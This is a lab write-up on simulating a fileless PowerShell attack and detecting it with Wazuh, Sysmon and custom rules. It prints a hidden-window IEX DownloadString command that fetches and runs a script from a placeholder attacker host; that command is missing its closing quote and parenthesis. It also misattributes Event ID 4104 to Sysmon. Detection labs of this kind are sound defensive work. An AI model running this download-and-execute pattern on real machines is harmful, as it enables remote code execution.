ðŸŽ¯ Objective
Simulate and detect a fileless malware attack where a PowerShell command executes a remote payload using DownloadString, mimicking a spear-phishing scenario. This attack involves a malicious PowerShell script that executes directly in memory, without writing a traditional installer to disk.

ðŸ§ª Attack Simulation Steps
Victim OS: Windows (monitored by Wazuh Agent with Sysmon)
Attacker Machine: (runs HTTP server hosting payload)

1. Create Malicious PowerShell Payload (on attacker machine)
File: malicious.ps1
Write-Host "Malicious script executed"
Start-Process notepad.exe
For simulation purposes, this script echo "Malicious script executed" and launches notepad.exe. In a real attack, it could drop or execute malware.

2. Host the Payload via Simple HTTP Server
cd /path/to/folder contain malicious.ps1 
python3 -m http.server 80

3. Execute Fileless Payload on Victim Machine (PowerShell)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>/malicious.ps1'

Wazuh + Sysmon Configuration
Sysmon is configured to capture:
 ** Event ID 11: FileCreate (monitors suspicious file writes)
 ** Event ID 4104: PowerShell script block logging

Wazuh is configured to use built-in rules:
 ** 92205: PowerShell dropped executable in Windows root
 ** 92213: Executable malware dropped in suspicious folders

ðŸ§¾ Custom Wazuh Rules (local_rules.xml)
<group name="windows,powershell,fileless,attack">

  <rule id="100300" level="12">
    <if_sid>92205</if_sid>
    <description>Fileless Attack - PowerShell dropped executable in Windows root folder</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <rule id="100301" level="12">
    <if_sid>92213</if_sid>
    <description>Fileless Attack - Executable dropped in suspicious location by script</description>
    <mitre>
      <id>T1059.003</id>
    </mitre>
  </rule>
</group>

âœ… Conclusion
This simulation successfully demonstrated how a fileless malware attack using PowerShell can be detected using Wazuh and Sysmon. 
By executing a malicious script remotely via DownloadString, we replicated a common spear-phishing scenario where no traditional malware file is written to disk â€” a technique increasingly used by modern attackers to bypass traditional antivirus solutions.
Wazuhâ€™s built-in rules (92205 and 92213) captured key behaviors such as PowerShell dropping files in critical or suspicious folders.
Our custom rules (100300 and 100301) then extended this detection by classifying the behavior under the MITRE ATT&CK framework (Techniques T1059.001 and T1059.003) and tagging it clearly as part of a fileless malware attack.
